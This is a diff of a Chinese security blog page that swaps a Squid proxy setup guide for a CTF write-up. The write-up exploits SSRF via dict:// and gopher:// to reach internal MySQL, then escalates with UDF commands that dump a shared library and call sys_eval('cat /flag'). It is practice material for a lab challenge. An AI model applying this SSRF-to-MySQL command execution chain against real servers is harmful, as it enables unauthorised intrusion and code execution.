@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>squid搭建代理服务器(centos7) | RainMaker</title>
+    <title>记一次SSRF练习 | RainMaker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
     
@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckxflrc7s001t444zcbzsfbez" class="article article-type-post" itemscope
+    <article id="post-ckxflrc8i004b444z7vp484cz" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -147,7 +147,7 @@
             
   
     <h1 class="article-title" itemprop="name">
-      squid搭建代理服务器(centos7)
+      记一次SSRF练习
     </h1>
   
 
@@ -157,18 +157,18 @@
         <div class="article-more-info article-more-info-post hairline">
 
             <div class="article-date">
-  <time datetime="2020-10-11T09:40:52.000Z" itemprop="datePublished">2020-10-11</time>
+  <time datetime="2021-12-19T14:47:12.000Z" itemprop="datePublished">2021-12-19</time>
 </div>
 
             
             <div class="article-category">
-                <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
+                <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>,<a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
             </div>
             
 
             
             <div class="article-tag">
-                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li></ul>
+                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li></ul>
             </div>
             
 
@@ -181,70 +181,38 @@
         </div>
 
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
-            <p>使用squid搭建 centos7代理服务器<span id="more"></span></p>
-<h2 id="Centos7服务器端"><a href="#Centos7服务器端" class="headerlink" title="Centos7服务器端"></a>Centos7服务器端</h2><p>1、开启IP_Forward：</p>
-<pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre>
+            <p>老表发我一个SSRF的CTF题，感觉还不错，还能练习下SSRF挖掘技巧，权作学习记录。</p>
+<h1 id="审题"><a href="#审题" class="headerlink" title="审题"></a>审题</h1><p>docker搭建好基本上就是一个seo站长工具界面，撸了一遍接口发现如下接口存在漏洞。<span id="more"></span></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211219225804012.png" alt="image-20211219225804012"></p>
+<h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211219225930395.png" alt="image-20211219225930395"></p>
+<p>到这基本上就确定SSRF点了，不过这个是我测试方法，一般情况下还要测试下外网域名是否能够访问。</p>
+<p>从info.php确定主机内网IP：172.73.23.21，之后就可以进行内网扫描。这个站点还有一个文件下载，能够造成任意文件读取，很有必要的，查看内网的一些信息（<code>proc/net/arp</code>）。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211219230814303.png" alt="image-20211219230814303"></p>
+<p>这个还是比较好的一个点，如果有该主机的话就会有mac地址信息。之后用dict进行端口扫描，发现3306端口。</p>
+<p>查看info.php可知使用了gopher协议，直接使用工具生成查询语句测试，注意二次URL编码。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211219231732614.png" alt="image-20211219231732614"></p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211219231932272.png" alt="image-20211219231932272"></p>
+<p>后续进行UDF提权，几个命令如下：</p>
+<pre><code class="hljs mysql">#查看主机版本及架构
+show variables like &#x27;%compile%&#x27;;
+#查看 plugin 目录（/usr/lib/mysql/plugin/）
+show variables like &#x27;plugin%&#x27;;              
+SELECT 0x7f454c460201010000000.......00000 INTO DUMPFILE &#x27;/usr/lib/mysql/udf.so&#x27;;
+#创建函数
+CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;         
+select sys_eval(&#x27;cat /flag&#x27;);</code></pre>
 
-<p>2、安装squid</p>
-<pre><code class="hljs bash">yum install squid</code></pre>
+<h1 id="交卷"><a href="#交卷" class="headerlink" title="交卷"></a>交卷</h1><p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211221121112016.png" alt="image-20211221121112016"></p>
+<h1 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h1><p>1.UDF提权过程中，系统环境可能不同，数据库版本可能不同，需要注意。</p>
+<p>2.dll，so文件获取可以在kali的路径<code>/usr/share/metasploit-framework/data/exploits/mysql/</code>下获取。</p>
+<p>3.gopherus在使用过程中要注意，不同的系统窗口复制粘贴可能大小限制，数据过长可以直接修改gopherus,避免row_input传参。</p>
+<p>4.插入数据过程中有限制的话可以使用如下语句拼接：</p>
+<pre><code class="hljs mysql">create table temp(data longblob);
+insert into temp(data) values (0x4d5a9000......);
+update temp set data = concat(data,0x33c2e......);
+select data from temp into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</code></pre>
 
-<p>3、修改配置文件/etc/squid/squid.conf</p>
-<pre><code class="hljs bash">vi /etc/squid/squid.conf</code></pre>
-<p>增加如下配置</p>
-<pre><code class="hljs bash">acl OverConnLimit maxconn 10       <span class="hljs-comment">#定义每个IP最大连接数</span>
-auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwords <span class="hljs-comment">#配置的认证方式和认证文件</span>
-auth_param basic children 5  <span class="hljs-comment">#认证程序的进程数</span>
-auth_param basic realm superman<span class="hljs-string">&#x27;s squid server #代理连接提示信息,详见下图</span>
-<span class="hljs-string">auth_param basic credentialsttl 5 hours #认证持续时间</span>
-<span class="hljs-string">acl authenticated proxy_auth REQUIRED #设置代理需要认证</span>
-<span class="hljs-string">http_access deny OverConnLimit #超出连接数则拒绝</span>
-<span class="hljs-string">http_access allow authenticated #允许认证用户访问</span>
-<span class="hljs-string">http_access deny all #拒绝其他访问</span></code></pre>
-<p><img src="https://img-blog.csdnimg.cn/20201011163855457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>注释如下配置：</p>
-<pre><code class="hljs bash"><span class="hljs-comment"># http_access deny !Safe_ports</span>
-<span class="hljs-comment"># http_access deny CONNECT !SSL_ports</span>
-<span class="hljs-comment"># http_access deny to_localhost</span>
-<span class="hljs-comment"># http_access allow localnet</span>
-<span class="hljs-comment"># http_access deny all</span></code></pre>
-<p>修改如下配置：</p>
-<pre><code class="hljs bash"><span class="hljs-comment"># Squid normally listens to port 3128</span>
-http_port 6666 <span class="hljs-comment">#修改默认端口3128为自定义端口6666</span></code></pre>
-
-<p>4、生成密码文件</p>
-<pre><code class="hljs bash">yum install httpd</code></pre>
-
-<pre><code class="hljs bash">htpasswd -c -d /etc/squid/passwords superman <span class="hljs-comment">#创建一个密码文件名为passwords，账号名为superman</span></code></pre>
-<p>注意密码长度过长会截断为8个字符，即密码长度&lt;=8。</p>
-<pre><code class="hljs bash">[root@vm228789 squid]<span class="hljs-comment"># htpasswd -c -d /etc/squid/passwords superman</span>
-New password:
-Re-type new password:
-Warning: Password truncated to 8 characters by CRYPT algorithm.
-Adding password <span class="hljs-keyword">for</span> user surperman</code></pre>
-<p>5、重启服务并加入开机启动</p>
-<pre><code class="hljs bash">systemctl start squid.service</code></pre>
-
-<pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> squid.service</code></pre>
-<p>6、防火墙开放6666端口</p>
-<pre><code class="hljs bash">firewall-cmd --zone=public --add-port=6666/tcp --permanent</code></pre>
-
-<pre><code class="hljs bash">systemctl restart firewalld.service <span class="hljs-comment">#重启防火墙生效</span></code></pre>
-
-<h2 id="Centos7-客户端"><a href="#Centos7-客户端" class="headerlink" title="Centos7 客户端"></a>Centos7 客户端</h2><p>1、编辑配置文件(设置永久全局代理)</p>
-<pre><code class="hljs bash">vi /etc/profile</code></pre>
-<p>2、末尾增加http_proxy配置，用户名密码为服务器端配置的账户superman 和自定义的8位密码</p>
-<pre><code class="hljs bash"><span class="hljs-comment">#add http_proxy</span>
-<span class="hljs-built_in">export</span> http_proxy=http://用户名:密码@服务器IP:端口/
-<span class="hljs-built_in">export</span> http_proxy</code></pre>
-<p>3、测试连接</p>
-<pre><code class="hljs python">[root@localhost /]<span class="hljs-comment"># curl http://myip.ipip.net</span>
-当前 IP：XXX.XXX.XXX.XXX  来自于：俄罗斯 新西伯利亚州</code></pre>
-
-
-
-<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ul>
-<li>1、squid配置文件格式不对启动不起来的，需要仔细检查，重点区分/<code>etc/squid3</code>和<code>/etc/squid</code>、<code>/usr/lib64/squid/</code>和<code>/usr/lib/squid/</code>,其实也就是关注有无该路径或者文件。</li>
-<li>2、<code>http_access allow authenticated</code><br>该项不要简写为auth_user，我测试的时候是没成功的，头铁的多试试</li>
-</ul>
+<p>5.udf提权只能创建so库里有的函数，不能随意命名，可以使用<code>objdump -tT lib_mysqludf_sys_64.so</code>查看。</p>
 
         </div>
 
@@ -269,19 +237,10 @@ Adding password <span class="hljs-keyword">for</span> user surperman</code></pre
     
 <nav class="article-nav">
   
-    <a href="/dbdb0474.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <div class="article-nav-caption">下一篇</div>
-      <div class="article-nav-title">
-        
-          一次失败的CTF尝试记录（SSRF利用）
-        
-      </div>
-    </a>
   
-  
-    <a href="/7b84e3eb.html" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/7209cfed.html" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-caption">上一篇</div>
-      <div class="article-nav-title">IPv6隧道搭建</div>
+      <div class="article-nav-title">Log4j漏洞内网检测</div>
     </a>
   
 </nav>
@@ -290,15 +249,15 @@ Adding password <span class="hljs-keyword">for</span> user surperman</code></pre
     <section class="share">
         <div class="share-title">分享</div>
         <a class="share-item" target="_blank"
-            href="https://twitter.com/share?text=squid搭建代理服务器(centos7) - RainMaker&url=http://hasaki-h2.github.io/e0249e5.html">
+            href="https://twitter.com/share?text=记一次SSRF练习 - RainMaker&url=http://hasaki-h2.github.io/80ca6920.html">
             <box-icon type='logo' name='twitter'></box-icon>
         </a>
         <a class="share-item" target="_blank"
-            href="https://www.facebook.com/sharer.php?title=squid搭建代理服务器(centos7) - RainMaker&u=http://hasaki-h2.github.io/e0249e5.html">
+            href="https://www.facebook.com/sharer.php?title=记一次SSRF练习 - RainMaker&u=http://hasaki-h2.github.io/80ca6920.html">
             <box-icon name='facebook-square' type='logo' ></box-icon>
         </a>
         <!-- <a class="share-item" target="_blank"
-            href="https://service.weibo.com/share/share.php?title=squid搭建代理服务器(centos7) - RainMaker&url=http://hasaki-h2.github.io/e0249e5.html&pic=">
+            href="https://service.weibo.com/share/share.php?title=记一次SSRF练习 - RainMaker&url=http://hasaki-h2.github.io/80ca6920.html&pic=">
             <div class="n-icon n-icon-weibo"></div>
         </a> -->
     </section>
